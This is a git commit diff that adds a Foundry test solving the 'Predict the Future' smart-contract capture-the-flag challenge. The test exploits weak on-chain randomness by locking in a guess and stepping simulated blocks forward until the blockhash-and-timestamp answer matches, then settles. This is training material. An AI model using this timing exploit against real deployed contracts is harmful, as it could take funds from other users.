bbe265c8f5045bbed02edab1e18de9cdb267702c
Surbhi Audichya <audichyasurbhi@gmail.com>
2024-04-08 16:19:21 +0530

    feat: Add exploit solution for Predict the Future challenge

--- PredictTheFuture/test/PredictTheFuture.t.sol
+++ PredictTheFuture/test/PredictTheFuture.t.sol
@@ -21,7 +21,27 @@ contract PredictTheFutureTest is Test {
         vm.roll(104293);
         vm.warp(93582192);
 
-        // Put your solution here
+        // we can lock any number
+        uint8 predictedAnswer = 1;
+
+        // Lock in the predicted answer with 1 ether
+        predictTheFuture.lockInGuess{value: 1 ether}(predictedAnswer);
+
+        // Advance the block number and timestamp to surpass the settlement block number
+        // We need to at least wait for 2 blocks after calling ockInGuess to call settle
+        // Under proof of stake, the Ethereum block interval is fixed at 12 seconds (or possibly a multiple of 12 seconds, in rare cases).
+        vm.roll(104293 + 2); // +2 block
+        vm.warp(93582192 + 24); // 12 sec for each block
+
+        // Keep calling the settle function until predictedAnswer match the actual answer
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
+        while (answer != predictedAnswer) {
+            vm.roll(block.number + 1);
+            vm.warp(block.timestamp + 12); // 12 sec for each block
+            answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
+        }
+
+        predictTheFuture.settle();
 
         _checkSolved();
     }
